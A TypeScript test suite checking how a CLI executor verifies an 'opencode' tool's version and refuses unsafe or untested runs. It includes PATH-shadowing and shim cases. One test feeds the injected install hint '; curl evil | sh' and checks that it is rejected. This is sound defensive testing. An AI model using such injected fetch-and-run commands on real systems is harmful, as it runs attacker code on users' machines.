/** D-321 slice 2 — the executor checks a tool's version before an action runs.
 *
 *  Each case runs a REAL stub `opencode`: answering `--version` with a scripted
 *  reply (and counting it in `probes`), and otherwise acting (leaving a `ran`
 *  marker). So "refused before anything started" is a fact about the folder, not
 *  about a mock. POSIX only (the stub is a shell script). */

import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { EventEmitter } from 'node:events';
import { tmpdir } from 'node:os';
import { PassThrough } from 'node:stream';
import { join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  cliToolVersionHash,
  type CliFailureDetail,
  type CliToolVersionPolicy,
} from '@recued/contracts';

import { createCliInvocationExecutor } from '../cli-invocation-executor.js';
import { createCliToolStatus } from '../cli-tool-status.js';

type Exec = ReturnType<typeof createCliInvocationExecutor>;
type CliCall = Parameters<Exec>[0];

const dirs: string[] = [];
afterEach(() => {
  vi.unstubAllEnvs();
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

/** A stub tool in a folder of its own; `version` is the shell its probe runs. */
const tool = (version: string): { path: string; dir: string } => {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'recued-d321-check-')));
  dirs.push(dir);
  const path = join(dir, 'opencode');
  writeFileSync(path, [
    '#!/bin/sh',
    'if [ "$1" = "--version" ]; then',
    `  echo probe >> "${dir}/probes"`,
    `  ${version}`,
    '  exit',
    'fi',
    `touch "${dir}/ran"`,
    'echo done',
  ].join('\n'));
  chmodSync(path, 0o755);
  return { path, dir };
};

const probes = (dir: string): number =>
  existsSync(join(dir, 'probes')) ? readFileSync(join(dir, 'probes'), 'utf8').split('\n').filter(Boolean).length : 0;
const ran = (dir: string): boolean => existsSync(join(dir, 'ran'));

const RANGE = { from: '1.18.35', before: '2.0.0' };
const REFUSE: CliToolVersionPolicy = { tested: RANGE, outside: 'refuse' };
const WARN: CliToolVersionPolicy = { tested: RANGE, outside: 'warn' };
const SLUG = 'recued-core/opencode';

const call = (path: string, version: CliToolVersionPolicy | null = REFUSE, over: Partial<CliCall> = {}): CliCall => ({
  slug: SLUG,
  operation_key: 'opencode.task',
  operation_id: 'recued-core/opencode.opencode.task',
  args: {},
  timeout_ms: 5_000,
  binding: {
    kind: 'cli_invocation',
    argv_template: [path, 'run'],
    shape: 'text',
    exit_code_handling: 'zero_is_success',
  },
  ...(version !== null ? { tool_version: { probe: [path, '--version'], version } } : {}),
  ...over,
} as CliCall);

const executor = (owner?: (id: string) => unknown): Exec => createCliInvocationExecutor({
  toolStatus: createCliToolStatus(),
  ...(owner !== undefined ? { readOwnerToolVersion: owner } : {}),
});

/** The refusal a call is expected to end in; fails the test if it ran. */
const refusal = async (exec: Exec, c: CliCall): Promise<CliFailureDetail & { message: string }> => {
  const outcome = await exec(c).then(() => undefined, (e: unknown) => e);
  expect(outcome, 'the call should have been refused').toBeInstanceOf(Error);
  const err = outcome as Error & { cli_failure?: CliFailureDetail };
  expect(err.cli_failure, 'the refusal should carry a cli_failure').toBeDefined();
  return { ...err.cli_failure!, message: err.message };
};

describe.skipIf(process.platform === 'win32')('D-321 — the version check before an action runs', () => {
  it('a version outside the range is refused before anything starts, saying why and what to do', async () => {
    const { path, dir } = tool('echo 2.0.1');
    const refused = await refusal(executor(), call(path));
    expect(refused).toEqual({
      reason: 'untested_version',
      slug: SLUG,
      operation_id: 'recued-core/opencode.opencode.task',
      tool: path,
      version: '2.0.1',
      tested: RANGE,
      message: `${path} 2.0.1 is installed, and this pack was tested with 1.x versions from 1.18.35, `
        + `so it did not run. Install a tested version, or choose Warn for ${path} on its pack's page in Packs.`,
    });
    expect(ran(dir)).toBe(false);
    expect(probes(dir)).toBe(1);
  });

  it('a version in the range runs', async () => {
    const { path, dir } = tool('echo 1.18.35');
    const result = await executor()(call(path)) as { stdout: string; exit_code: number };
    expect(result).toMatchObject({ exit_code: 0, stdout: 'done\n' });
    expect(ran(dir)).toBe(true);
  });

  it('the version is read once: the next run uses the cached read', async () => {
    const { path, dir } = tool('echo 1.18.35');
    const exec = executor();
    await exec(call(path));
    await exec(call(path));
    expect(probes(dir)).toBe(1);
  });

  it('a tool killed by a signal is refused as broken, with the line it printed, whatever the setting', async () => {
    const { path, dir } = tool('echo "dyld: Library not loaded: /opt/homebrew/opt/x265/lib/libx265.216.dylib" >&2; kill -ABRT $$');
    for (const version of [REFUSE, WARN]) {
      const refused = await refusal(executor(), call(path, version));
      expect(refused).toEqual({
        reason: 'broken',
        slug: SLUG,
        operation_id: 'recued-core/opencode.opencode.task',
        tool: path,
        message: `${path} is installed but does not start: dyld: Library not loaded: /opt/homebrew/opt/x265/lib/libx265.216.dylib`,
      });
    }
    expect(ran(dir)).toBe(false);
  });

  it('a tool that does not answer in time is refused as broken', async () => {
    const { path, dir } = tool('sleep 30');
    const exec = createCliInvocationExecutor({ toolStatus: createCliToolStatus({ timeoutMs: 1_000 }) });
    const refused = await refusal(exec, call(path));
    expect(refused.reason).toBe('broken');
    expect(refused.message).toBe(`${path} is installed but does not start: '${path} --version' did not finish within 1 second.`);
    expect(ran(dir)).toBe(false);
  });

  it('a version that cannot be read is refused under Refuse: a non-zero exit', async () => {
    const { path, dir } = tool('echo "no config file" >&2; exit 1');
    const refused = await refusal(executor(), call(path));
    expect(refused).toEqual({
      reason: 'untested_version',
      slug: SLUG,
      operation_id: 'recued-core/opencode.opencode.task',
      tool: path,
      tested: RANGE,
      message: `${path} did not report its version: '${path} --version' exited with code 1 (no config file). `
        + `This pack was tested with 1.x versions from 1.18.35, so it did not run. `
        + `Check that ${path} works, or choose Warn for ${path} on its pack's page in Packs.`,
    });
    expect(ran(dir)).toBe(false);
  });

  it('a version that cannot be read is refused under Refuse: no number printed', async () => {
    const { path } = tool('echo opencode');
    const refused = await refusal(executor(), call(path));
    expect(refused.reason).toBe('untested_version');
    expect(refused.message).toContain(`did not report its version: '${path} --version' printed no version number.`);
  });

  it('under the pack default Warn, an untested or unreadable version runs', async () => {
    for (const reply of ['echo 2.0.1', 'echo opencode', 'exit 3']) {
      const { path, dir } = tool(reply);
      await executor()(call(path, WARN));
      expect(ran(dir), reply).toBe(true);
    }
  });

  describe("the owner's choice", () => {
    it('Warn over a pack that refuses: the untested version runs', async () => {
      const { path, dir } = tool('echo 2.0.1');
      const owner = (id: string) => (id === SLUG ? { outside: 'warn', version_hash: cliToolVersionHash(REFUSE) } : undefined);
      await executor(owner)(call(path));
      expect(ran(dir)).toBe(true);
    });

    it('Refuse over a pack that warns: the untested version is refused', async () => {
      const { path, dir } = tool('echo 2.0.1');
      const owner = () => ({ outside: 'refuse', version_hash: cliToolVersionHash(WARN) });
      expect((await refusal(executor(owner), call(path, WARN))).reason).toBe('untested_version');
      expect(ran(dir)).toBe(false);
    });

    it('a choice made for an older range is not applied: the pack default refuses', async () => {
      const { path, dir } = tool('echo 2.0.1');
      const older: CliToolVersionPolicy = { tested: { from: '1.15.13', before: '2.0.0' }, outside: 'refuse' };
      const owner = () => ({ outside: 'warn', version_hash: cliToolVersionHash(older) });
      expect((await refusal(executor(owner), call(path))).reason).toBe('untested_version');
      expect(ran(dir)).toBe(false);
    });

    it("another catalog's choice is not this one's", async () => {
      const { path, dir } = tool('echo 2.0.1');
      const owner = (id: string) => (id === 'recued-core/other' ? { outside: 'warn', version_hash: cliToolVersionHash(REFUSE) } : undefined);
      expect((await refusal(executor(owner), call(path))).reason).toBe('untested_version');
      expect(ran(dir)).toBe(false);
    });

    it('a choice that cannot be read refuses, rather than guess', async () => {
      const { path, dir } = tool('echo 2.0.1');
      const owner = () => { throw new Error('store closed'); };
      expect((await refusal(executor(owner), call(path, WARN))).reason).toBe('untested_version');
      expect(ran(dir)).toBe(false);
    });

    it('a version in the range never reads the choice', async () => {
      const { path } = tool('echo 1.18.35');
      let reads = 0;
      await executor(() => { reads += 1; return undefined; })(call(path));
      expect(reads).toBe(0);
    });
  });

  describe('a probe the server does not run (a catalog nothing checked)', () => {
    it('one asking for more than the version is never run, and Refuse refuses, saying so', async () => {
      const { path, dir } = tool('echo 1.18.35');
      const c = call(path, REFUSE, { tool_version: { probe: [path, 'run'], version: REFUSE } } as Partial<CliCall>);
      const refused = await refusal(executor(), c);
      expect(refused).toEqual({
        reason: 'untested_version',
        slug: SLUG,
        operation_id: 'recued-core/opencode.opencode.task',
        tool: path,
        tested: RANGE,
        message: `${path}'s version was not read: its pack's version check '${path} run' is not one Recued runs, `
          + `because it may only ask ${path} for its version. This pack was tested with 1.x versions from 1.18.35, `
          + `so it did not run. Update the pack, or choose Warn for ${path} on its pack's page in Packs.`,
      });
      // `run` is an action for the stub: had the probe run, it would have left the marker.
      expect(ran(dir)).toBe(false);
    });

    it('one naming another program than the action runs is never run', async () => {
      const { path, dir } = tool('echo 1.18.35');
      const other = tool('echo 1.18.35');
      const c = call(path, REFUSE, { tool_version: { probe: [other.path, '--version'], version: REFUSE } } as Partial<CliCall>);
      expect((await refusal(executor(), c)).reason).toBe('untested_version');
      expect(probes(other.dir)).toBe(0);
      expect(ran(dir)).toBe(false);
    });

    it('under Warn the action runs, and the probe still does not', async () => {
      const { path, dir } = tool('echo 1.18.35');
      const other = tool('echo 1.18.35');
      await executor()(call(path, WARN, { tool_version: { probe: [other.path, '--version'], version: WARN } } as Partial<CliCall>));
      expect(probes(other.dir)).toBe(0);
      expect(ran(dir)).toBe(true);
    });
  });

  it('a catalog with no range is not probed, and runs as before', async () => {
    const { path, dir } = tool('echo 2.0.1');
    await executor()(call(path, null));
    expect(probes(dir)).toBe(0);
    expect(ran(dir)).toBe(true);
  });

  it('a tool not on PATH goes on to the launch, which reports not_found as without a range', async () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'recued-d321-check-')));
    dirs.push(dir);
    const missing = join(dir, 'opencode');
    const refused = await refusal(executor(), call(missing));
    expect(refused.reason).toBe('not_found');
  });

  describe('a tool that is not found says how to install it (slice 3)', () => {
    const missingTool = (): string => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'recued-d321-check-')));
      dirs.push(dir);
      return join(dir, 'opencode');
    };

    it('with the command for this server, asking for the tested major', async () => {
      const missing = missingTool();
      const refused = await refusal(executor(), call(missing, REFUSE, {
        tool_install: [{ manager: 'npm', package: 'opencode-ai' }, { docs: 'https://opencode.ai/docs' }],
      } as Partial<CliCall>));
      expect(refused).toMatchObject({
        reason: 'not_found',
        tool: missing,
        install: ['npm install -g opencode-ai@1'],
        install_docs: ['https://opencode.ai/docs'],
      });
      expect(refused.message).toBe(
        `cli tool '${missing}' was not found — the binary may not be installed or is not on the server's PATH. `
          + 'Install it with: npm install -g opencode-ai@1.',
      );
    });

    it('without a range, the command asks for no version', async () => {
      const missing = missingTool();
      const refused = await refusal(executor(), call(missing, null, {
        tool_install: [{ manager: 'npm', package: 'opencode-ai' }],
      } as Partial<CliCall>));
      expect(refused.message).toMatch(/Install it with: npm install -g opencode-ai\.$/u);
    });

    it('with only a docs link, it points there', async () => {
      const missing = missingTool();
      const refused = await refusal(executor(), call(missing, null, {
        tool_install: [{ docs: 'https://opencode.ai/docs' }],
      } as Partial<CliCall>));
      expect(refused.message).toMatch(/Its install instructions: https:\/\/opencode\.ai\/docs\.$/u);
      expect(refused.install).toBeUndefined();
    });

    it('with no hints, it says what it always said', async () => {
      const missing = missingTool();
      const refused = await refusal(executor(), call(missing, null));
      expect(refused.message).toBe(
        `cli tool '${missing}' was not found — the binary may not be installed or is not on the server's PATH.`,
      );
      expect(refused.install).toBeUndefined();
      expect(refused.install_docs).toBeUndefined();
    });

    it('a hint that does not pass is never shown', async () => {
      const missing = missingTool();
      const refused = await refusal(executor(), call(missing, null, {
        tool_install: [{ manager: 'npm', package: '; curl evil | sh' }],
      } as Partial<CliCall>));
      expect(refused.message).not.toContain('Install it with');
      expect(refused.message).not.toContain('curl');
    });
  });

  it('a refused run reads no input file', async () => {
    const { path, dir } = tool('echo 2.0.1');
    let reads = 0;
    const exec = createCliInvocationExecutor({
      toolStatus: createCliToolStatus(),
      readFileBytes: async () => {
        reads += 1;
        return { bytes: Buffer.from('x'), mime_type: 'text/plain', filename: 'x.txt' };
      },
    });
    const c = call(path, REFUSE, {
      args: { source: `file:${'0'.repeat(32)}` },
      binding: {
        kind: 'cli_invocation',
        argv_template: [path, 'run', '{source}'],
        shape: 'text',
        exit_code_handling: 'zero_is_success',
        input_materialize: { kind: 'file_ref', arg: 'source' },
      },
    } as Partial<CliCall>);
    expect((await refusal(exec, c)).reason).toBe('untested_version');
    expect(reads).toBe(0);
    expect(ran(dir)).toBe(false);
  });

  it('a run cancelled before it starts is not probed', async () => {
    const { path, dir } = tool('echo 2.0.1');
    const abort = new AbortController();
    abort.abort();
    const outcome = await executor()(call(path, REFUSE, { signal: abort.signal })).then(() => 'ran', (e: unknown) => e);
    expect(outcome).toBeInstanceOf(Error);
    expect((outcome as Error).message).toMatch(/cancelled before spawn/);
    expect(probes(dir)).toBe(0);
    expect(ran(dir)).toBe(false);
  });

  describe('the launch runs the file the check read (D-321 audit)', () => {
    /** A repository with its own `opencode`, at its root and in `bin/`. */
    const repository = (): string => {
      const repo = realpathSync(mkdtempSync(join(tmpdir(), 'recued-d321-repo-')));
      dirs.push(repo);
      for (const at of [repo, join(repo, 'bin')]) {
        mkdirSync(at, { recursive: true });
        writeFileSync(join(at, 'opencode'), `#!/bin/sh\ntouch "${repo}/repo-ran"\necho 1.18.35\n`);
        chmodSync(join(at, 'opencode'), 0o755);
      }
      return repo;
    };
    /** An action that names its program bare, and works in `repo`. */
    const inRepo = (repo: string, version: CliToolVersionPolicy = REFUSE): CliCall => ({
      ...call('opencode', version),
      binding: {
        kind: 'cli_invocation',
        argv_template: ['opencode', 'run'],
        shape: 'text',
        exit_code_handling: 'zero_is_success',
        cwd: { arg: '{repo_dir}' },
      },
      args: { repo_dir: repo },
      tool_version: { probe: ['opencode', '--version'], version },
    } as unknown as CliCall);

    it("a repository's own copy never runs in place of the installed one", async () => {
      const installed = tool('echo 1.18.35');
      const repo = repository();
      // An empty PATH entry (the working folder to Node's own search) and a
      // relative one, both before the installed tool.
      vi.stubEnv('PATH', `:bin:${installed.dir}:/usr/bin:/bin`);
      await executor()(inRepo(repo));
      expect(ran(installed.dir)).toBe(true);
      expect(existsSync(join(repo, 'repo-ran'))).toBe(false);
    });

    it('a tool found only in the repository is not found, and nothing runs', async () => {
      const repo = repository();
      vi.stubEnv('PATH', ':bin:/usr/bin:/bin');
      const refused = await refusal(executor(), inRepo(repo, WARN));
      expect(refused.reason).toBe('not_found');
      expect(existsSync(join(repo, 'repo-ran'))).toBe(false);
    });

    // D-321 § 8 — a version manager's shim (`<dir>/shims/opencode`) starts the
    // version the folder it starts in names, so the check reads it there. This
    // stand-in runs `.tool-version`'s version, else 1.18.35, and an action leaves
    // the version it ran as `ran`.
    const shim = (): string => {
      const root = realpathSync(mkdtempSync(join(tmpdir(), 'recued-d321-shim-')));
      dirs.push(root);
      const dir = join(root, 'shims');
      mkdirSync(dir);
      writeFileSync(join(dir, 'opencode'), [
        '#!/bin/sh',
        'v=1.18.35; if [ -f .tool-version ]; then v=$(cat .tool-version); fi',
        'if [ "$1" = "--version" ]; then echo "$v"; exit; fi',
        `echo "$v" > "${dir}/ran"`,
      ].join('\n'));
      chmodSync(join(dir, 'opencode'), 0o755);
      return dir;
    };
    const folderPinning = (version?: string): string => {
      const dir = realpathSync(mkdtempSync(join(tmpdir(), 'recued-d321-pins-')));
      dirs.push(dir);
      if (version !== undefined) writeFileSync(join(dir, '.tool-version'), `${version}\n`);
      return dir;
    };

    it("a shim is read where the action runs: a repository pinning an untested version is refused", async () => {
      const dir = shim();
      vi.stubEnv('PATH', `${dir}:/usr/bin:/bin`);
      const pinned = folderPinning('2.0.1');
      const refused = await refusal(executor(), inRepo(pinned));
      expect(refused).toMatchObject({ reason: 'untested_version', version: '2.0.1' });
      // The version is that folder's: the installed one is in range.
      expect(refused.message).toBe(
        `opencode 2.0.1 is the version its version manager starts in ${pinned}, and this pack was `
        + 'tested with 1.x versions from 1.18.35, so it did not run. Set a tested version for that '
        + 'folder, or '
        + "choose Warn for opencode on its pack's page in Packs.",
      );
      expect(existsSync(join(dir, 'ran'))).toBe(false);
    });

    it('and the same shim runs an action in a folder that pins none', async () => {
      const dir = shim();
      vi.stubEnv('PATH', `${dir}:/usr/bin:/bin`);
      await executor()(inRepo(folderPinning()));
      expect(readFileSync(join(dir, 'ran'), 'utf8').trim()).toBe('1.18.35');
    });
  });

  it('a cancelled call is refused before the check, and nothing starts', async () => {
    const { path, dir } = tool('echo 2.0.1');
    const controller = new AbortController();
    controller.abort();
    const outcome = await executor()({ ...call(path, WARN), signal: controller.signal } as CliCall)
      .then(() => 'ran', (err: Error) => err.message);
    expect(outcome).toBe("cli_invocation 'recued-core/opencode.opencode.task' cancelled before spawn");
    // A probe started anyway would land a moment later: wait for it before counting.
    await new Promise((done) => setTimeout(done, 300));
    expect(probes(dir)).toBe(0);
    expect(ran(dir)).toBe(false);
  });

  it('a cancelled detached launch of a pack with no range does not start either', async () => {
    // A detached launch reads no signal of its own: before the audit, a call
    // cancelled after the gateway's own kill check still started it.
    const { path, dir } = tool('echo 1.18.35');
    const results = realpathSync(mkdtempSync(join(tmpdir(), 'recued-d321-detached-')));
    dirs.push(results);
    const controller = new AbortController();
    controller.abort();
    const detached = {
      ...call(path, null),
      args: { result_dir: results, key: 'job_1' },
      binding: {
        kind: 'cli_invocation',
        argv_template: [path, 'run'],
        stdin_handling: 'none',
        shape: 'text',
        exit_code_handling: 'zero_is_success',
        detached: {
          mode: 'runtime_managed',
          completion: { kind: 'marker_file', exit_pattern: '{result_dir}/{key}.exit.{code}' },
        },
      },
      signal: controller.signal,
    } as unknown as CliCall;
    const outcome = await executor()(detached).then(() => 'ran', (err: Error) => err.message);
    expect(outcome).toBe("cli_invocation 'recued-core/opencode.opencode.task' cancelled before spawn");
    await new Promise((done) => setTimeout(done, 300));
    expect(ran(dir)).toBe(false);
  });

  it('a launch that fails to start the program leaves no Warn note', async () => {
    // The check reads 2.0.1 under Warn; the launch is attempted and the program
    // never starts (an `error`, never a `spawn`), as when the file cannot be run.
    const { path } = tool('echo 2.0.1');
    const notes: string[] = [];
    const failingSpawn = (() => {
      const child = Object.assign(new EventEmitter(), {
        stdout: new PassThrough(),
        stderr: new PassThrough(),
        stdin: null,
        pid: undefined,
        kill: () => true,
      });
      setImmediate(() => child.emit('error', Object.assign(new Error('spawn EACCES'), { code: 'EACCES' })));
      return child;
    }) as unknown as typeof import('node:child_process').spawn;
    const exec = createCliInvocationExecutor({
      toolStatus: createCliToolStatus(),
      spawn: failingSpawn,
      onUntestedToolRan: (runId) => { notes.push(runId); },
    });
    await exec({ ...call(path, WARN), stepMeta: { run_id: 'run-1', step_id: 'task' } } as unknown as CliCall)
      .catch(() => undefined);
    expect(notes).toEqual([]);
  });

  it('the Warn note is made only once the program has started', async () => {
    const { path, dir } = tool('echo 2.0.1');
    const notes: string[] = [];
    const exec = createCliInvocationExecutor({
      toolStatus: createCliToolStatus(),
      onUntestedToolRan: (runId) => { notes.push(runId); },
    });
    const base = call(path, WARN);
    // Refused after the check, before anything starts: it pins a variable no binding may.
    const refusedLater = {
      ...base,
      binding: { ...base.binding, env: { PATH: '/tmp' } },
      stepMeta: { run_id: 'run-1', step_id: 'task' },
    } as unknown as CliCall;
    await exec(refusedLater).catch(() => undefined);
    expect(ran(dir)).toBe(false);
    expect(notes).toEqual([]);
    await exec({ ...base, stepMeta: { run_id: 'run-2', step_id: 'task' } } as unknown as CliCall);
    expect(ran(dir)).toBe(true);
    expect(notes).toEqual(['run-2']);
  });
});
